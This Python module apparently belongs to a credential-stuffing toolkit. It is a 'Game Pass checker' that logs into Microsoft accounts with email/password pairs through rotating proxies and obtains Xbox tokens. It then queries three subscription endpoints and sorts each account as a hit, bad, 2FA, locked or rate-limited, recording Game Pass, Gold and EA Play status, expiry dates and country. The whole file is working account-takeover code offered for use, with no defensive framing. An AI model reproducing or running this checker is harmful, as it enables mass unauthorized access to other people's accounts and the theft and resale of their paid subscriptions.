"""
╔══════════════════════════════════════════╗
║   GAME PASS CHECKER                     ║
║          MADE BY - @NUTFRR              ║
╚══════════════════════════════════════════╝
Microsoft OAuth2 → Xbox auth → Full subscription capture
Checks: GPU, PC Game Pass, Gold, expiry dates, Family Plan
"""
import requests

STATUS_HIT    = "HIT"
STATUS_BAD    = "BAD"
STATUS_2FA    = "2FA"
STATUS_LOCKED = "LOCKED"
STATUS_RATE   = "RATELIMIT"
STATUS_ERROR  = "ERROR"
STATUS_NO_SUB = "NO_SUBSCRIPTION"

SUBSCRIPTION_IDS = {
    # Game Pass Ultimate
    "cfq7ttc0khs0": "Game Pass Ultimate",
    "cfq7ttc0kgq8": "Game Pass Ultimate",
    "9mz0x3wkwkk7": "Game Pass Ultimate",
    "cfq7ttc0k5dj": "Game Pass Ultimate",
    # PC Game Pass
    "cfq7ttc0kgq9": "PC Game Pass",
    "9mvp3g42ngk3": "PC Game Pass",
    # Xbox Live Gold / Core
    "cfq7ttc0khrd": "Xbox Live Gold",
    "cfq7ttc0k5b7": "Xbox Live Gold",
    "cfq7ttc0k85v": "Xbox Core",
    # EA Play (via GPU)
    "cfq7ttc0k5bj": "EA Play",
    # Xbox All Access
    "cfq7ttc0lgz9": "Xbox All Access",
}


def _s(proxy=None):
    s = requests.Session()
    s.timeout = 15
    if proxy:
        p = proxy if proxy.startswith("http") else f"http://{proxy}"
        s.proxies = {"http": p, "https": p}
    return s


def get_all_subscriptions(access_token: str, xsts_token: str, uhs: str, proxy=None) -> list:
    """Try multiple subscription endpoints for maximum capture."""
    s = _s(proxy)
    subs = []

    # Endpoint 1: Licensing bundles
    try:
        r = s.get(
            "https://licensing.xboxlive.com/v8.0/users/me/bundles",
            headers={
                "Authorization":          f"XBL3.0 x={uhs};{xsts_token}",
                "x-xbl-contract-version": "8",
                "Accept":                 "application/json",
            }
        )
        for item in r.json().get("items", []):
            pid    = item.get("productId", "").lower()
            end    = item.get("endDate", "")[:10]
            state  = item.get("subscriptionState", "")
            active = state in ("Active", "InGracePeriod")
            name   = SUBSCRIPTION_IDS.get(pid)
            if not name:
                for k, v in SUBSCRIPTION_IDS.items():
                    if k in pid:
                        name = v
                        break
            if name:
                subs.append({
                    "name":   name,
                    "active": active,
                    "expiry": end,
                    "state":  state,
                    "pid":    pid,
                })
    except Exception:
        pass

    # Endpoint 2: MembershipAssociations (older)
    try:
        r2 = s.get(
            "https://accounts.xboxlive.com/users/current/subscriptions",
            headers={
                "Authorization":          f"XBL3.0 x={uhs};{xsts_token}",
                "x-xbl-contract-version": "1",
                "Accept":                 "application/json",
            }
        )
        for item in r2.json().get("subscriptions", []):
            existing = [x["pid"] for x in subs]
            pid = item.get("productId", "").lower()
            if pid in existing:
                continue
            end   = item.get("endDate", "")[:10]
            state = item.get("state", "")
            name  = SUBSCRIPTION_IDS.get(pid)
            if not name:
                for k, v in SUBSCRIPTION_IDS.items():
                    if k in pid:
                        name = v
                        break
            if name:
                subs.append({
                    "name":   name,
                    "active": state == "Active",
                    "expiry": end,
                    "state":  state,
                    "pid":    pid,
                })
    except Exception:
        pass

    # Endpoint 3: MS Store subscription API
    try:
        r3 = s.get(
            f"https://purchase.mp.microsoft.com/v8.0/b2b/recurring/subscriptions",
            headers={
                "Authorization": f"Bearer {access_token}",
                "Accept":        "application/json",
            }
        )
        for item in r3.json().get("items", []):
            pid   = item.get("productId", "").lower()
            end   = item.get("currentPeriodEndDate", "")[:10]
            state = item.get("autoRenewEnabled", False)
            name  = SUBSCRIPTION_IDS.get(pid)
            if name and pid not in [x["pid"] for x in subs]:
                subs.append({
                    "name":   name,
                    "active": True,
                    "expiry": end,
                    "state":  "Active",
                    "pid":    pid,
                })
    except Exception:
        pass

    return subs


def check_gamepass(email: str, password: str, proxy=None) -> dict:
    base = {"email": email, "password": password, "checker": "gamepass"}

    from checkers.xbox_checker import ms_login, _exchange_code, get_xbox_user_token, get_xsts_token, get_account_meta
    login = ms_login(email, password, proxy)
    st    = login.get("status")

    if st == "BAD":       return {**base, "status": STATUS_BAD}
    if st == "2FA":       return {**base, "status": STATUS_2FA}
    if st == "LOCKED":    return {**base, "status": STATUS_LOCKED}
    if st == "RATELIMIT": return {**base, "status": STATUS_RATE}
    if st not in ("CODE", "TOKEN"):
        return {**base, "status": st or STATUS_ERROR}

    sess         = login.get("session")
    access_token = login.get("access_token") or _exchange_code(login.get("code", ""), sess)
    if not access_token:
        return {**base, "status": STATUS_ERROR}

    xbl  = get_xbox_user_token(access_token, proxy)
    if not xbl.get("token"):
        return {**base, "status": STATUS_NO_SUB, "detail": "no_xbox"}

    xsts = get_xsts_token(xbl["token"], proxy)
    if xsts.get("status") != "ok":
        return {**base, "status": STATUS_NO_SUB}

    subs = get_all_subscriptions(access_token, xsts["token"], xsts["uhs"], proxy)
    meta = get_account_meta(access_token, proxy)

    if not subs:
        return {
            **base,
            "status":  STATUS_NO_SUB,
            "country": meta.get("country", ""),
        }

    active_subs = [s for s in subs if s["active"]]
    has_gpu     = any("Ultimate" in s["name"] for s in active_subs)
    has_pc      = any("PC Game Pass" in s["name"] for s in active_subs)
    has_gold    = any("Gold" in s["name"] or "Core" in s["name"] for s in active_subs)
    has_ea      = any("EA" in s["name"] for s in active_subs)

    gpu_expiry  = next((s["expiry"] for s in active_subs if "Ultimate" in s["name"]), "")
    pc_expiry   = next((s["expiry"] for s in active_subs if "PC Game Pass" in s["name"]), "")
    gold_expiry = next((s["expiry"] for s in active_subs if "Gold" in s["name"] or "Core" in s["name"]), "")

    return {
        **base,
        "status":             STATUS_HIT,
        "game_pass_ultimate": has_gpu,
        "game_pass_pc":       has_pc,
        "xbox_live_gold":     has_gold,
        "ea_play":            has_ea,
        "gpu_expiry":         gpu_expiry,
        "pc_expiry":          pc_expiry,
        "gold_expiry":        gold_expiry,
        "all_subs":           [s["name"] for s in active_subs],
        "country":            meta.get("country", ""),
    }
